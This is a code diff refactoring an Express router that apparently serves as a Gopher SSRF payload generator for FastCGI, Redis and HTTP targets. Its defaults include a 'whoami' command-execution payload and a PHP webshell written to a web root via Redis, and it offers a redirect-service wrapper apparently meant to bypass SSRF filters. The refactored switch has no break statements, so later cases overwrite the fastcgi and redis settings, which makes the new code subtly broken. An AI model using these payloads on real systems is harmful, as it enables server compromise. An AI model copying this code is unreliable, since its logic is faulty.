@@ -16,118 +16,78 @@ const redis = require('../utils/gopher/redis');
 const http = require('../utils/gopher/http');
 const querystring = require('querystring');
 
-router.post('/fastcgi', validate([
-    body('host').optional(),
-    body('port').optional().isNumeric().withMessage('Port must be a number')
-        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
-    body('filename').optional().isString(),
-    body('command').optional().isString(),
-    body('urlencode').optional().isString(),
-    body('r3dir').optional().isString(),
-    body('suffix').optional().isString(),
-]), async (req, res, next) => {
-    try {
-        fastcgi.host = req.body.host || '127.0.0.1';
-        fastcgi.port = req.body.port || 9000;
-        fastcgi.filename = req.body.filename || '/usr/share/php/PEAR.php';
-        fastcgi.command = req.body.command || 'system("whoami");';
 
-        let generated = fastcgi.generatePayload();
-        if (req.body.urlencode) {
-            generated = querystring.escape(generated);
-        }
-        generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
-        if (req.body.r3dir) {
-            if (req.body.suffix) {
-                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
-            } else {
-                res.send("//307.r3dir.me/--to/?url=" + generated);
+for (const [path, gopher] of Object.entries({
+    'fastcgi': fastcgi,
+    'redis': redis,
+    'http': http,
+})) {
+    router.post('/' + path, validate([
+        body('host').optional(),
+        body('port').optional().isNumeric().withMessage('Port must be a number')
+            .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
+        body('urlencode').optional().isString(),
+        body('r3dir').optional().isString(),
+        body('prefix').optional().isString(),
+        body('suffix').optional().isString(),
+
+        body('filename').optional().isString(),
+        body('command').optional().isString(),
+
+        body('filepath').optional().isString(),
+        body('content').optional().isString(),
+
+        body('path').optional().isString(),
+        body('method').optional().isString(),
+        body('path').optional().isString(),
+        body('type').optional().isString(),
+        body('body').optional(),
+        body('headers').optional().isObject().withMessage("Invalid JSON"),
+    ]), async (req, res, next) => {
+        try {
+            gopher.host = req.body.host || '127.0.0.1';
+            switch(path) {
+                case 'fastcgi':
+                    gopher.port = req.body.port || 9000;
+                    gopher.filename = req.body.filename || '/usr/share/php/PEAR.php';
+                    gopher.command = req.body.command || 'system("whoami");';
+                case 'redis':
+                    gopher.port = req.body.port || '6379';
+                    gopher.filepath = req.body.filepath || '/var/www/html';
+                    gopher.filename = req.body.filename || 's.php';
+                    gopher.content = req.body.content || '<?php evil($_POST["x"]);';
+                case 'http':
+                    gopher.port = req.body.port || '80';
+                    gopher.method = req.body.method || 'GET';
+                    gopher.path = req.body.path || '/';
+                    gopher.type = req.body.type || 'x-www-form-urlencoded';
+                    gopher.body = req.body.body || '';
+                    gopher.headers = req.body.headers || {};
             }
-        } else {
-            res.send(generated);
-        }
-    } catch (error) {
-        next(error);
-    }
-});
 
-router.post('/redis', validate([
-    body('host').optional(),
-    body('port').optional().isNumeric().withMessage('Port must be a number')
-        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
-    body('filename').optional().isString(),
-    body('filepath').optional().isString(),
-    body('content').optional().isString(),
-    body('urlencode').optional().isString(),
-    body('r3dir').optional().isString(),
-    body('suffix').optional().isString(),
-]), async (req, res, next) => {
-    try {
-        redis.host = req.body.host || '127.0.0.1';
-        redis.port = req.body.port || '6379';
-        redis.filepath = req.body.filepath || '/var/www/html';
-        redis.filename = req.body.filename || 's.php';
-        redis.content = req.body.content || '<?php evil($_POST["x"]);';
-
-        let generated = redis.generatePayload();
-        if (req.body.urlencode) {
-            generated = querystring.escape(generated);
-        }
-        generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
-        if (req.body.r3dir) {
-            if (req.body.suffix) {
-                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
-            } else {
-                res.send("//307.r3dir.me/--to/?url=" + generated);
+            let generated = gopher.generatePayload();
+            if (req.body.urlencode) {
+                generated = querystring.escape(generated);
             }
-        } else {
-            res.send(generated);
-        }
-    } catch (error) {
-        next(error);
-    }
-});
 
-router.post('/http', validate([
-    body('host').optional(),
-    body('port').optional().isNumeric().withMessage('Port must be a number')
-        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
-    body('path').optional().isString(),
-    body('method').optional().isString(),
-    body('path').optional().isString(),
-    body('type').optional().isString(),
-    body('body').optional(),
-    body('headers').optional().isObject().withMessage("Invalid JSON"),
-    body('urlencode').optional().isString(),
-    body('r3dir').optional().isString(),
-    body('suffix').optional().isString(),
-]), async (req, res, next) => {
-    try {
-        http.host = req.body.host || '127.0.0.1';
-        http.port = req.body.port || '80';
-        http.method = req.body.method || 'GET';
-        http.path = req.body.path || '/';
-        http.type = req.body.type || 'x-www-form-urlencoded';
-        http.body = req.body.body || '';
-        http.headers = req.body.headers || {};
+            generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
 
-        let generated = http.generatePayload();
-        if (req.body.urlencode) {
-            generated = querystring.escape(generated);
-        }
-        generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
-        if (req.body.r3dir) {
             if (req.body.suffix) {
-                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
-            } else {
-                res.send("//307.r3dir.me/--to/?url=" + generated);
+                generated += "%23%2F" + req.body.suffix;
             }
-        } else {
+
+            if (req.body.r3dir) {
+                generated = "//307.r3dir.me/--to/?url=" + generated;
+            }
+
+            if (req.body.prefix) {
+                generated = req.body.prefix + generated;
+            }
             res.send(generated);
+        } catch (error) {
+            next(error);
         }
-    } catch (error) {
-        next(error);
-    }
-});
+    });
+}
 
 module.exports = router;
